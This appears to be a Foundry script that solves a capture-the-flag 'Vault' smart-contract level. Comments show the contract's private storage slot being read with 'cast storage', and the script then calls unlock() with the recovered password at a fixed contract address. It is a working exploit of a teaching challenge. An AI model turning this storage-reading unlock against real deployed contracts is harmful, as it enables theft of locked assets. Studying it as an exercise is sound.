// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultHack is Script {
    Vault public vault =
        Vault(payable(0x2d07d03c693b0062767edAa228a8D28698789Ce4));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault before hack", vault.locked());

        vault.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        console.log("Vaults after hack", vault.locked());

        vm.stopBroadcast();
    }
}
// cast storage 0x2d07d03c693b0062767edAa228a8D28698789Ce4 1
// forge script script/Vault.s.sol -vv
// forge script script/Vault.s.sol -vv --broadcast
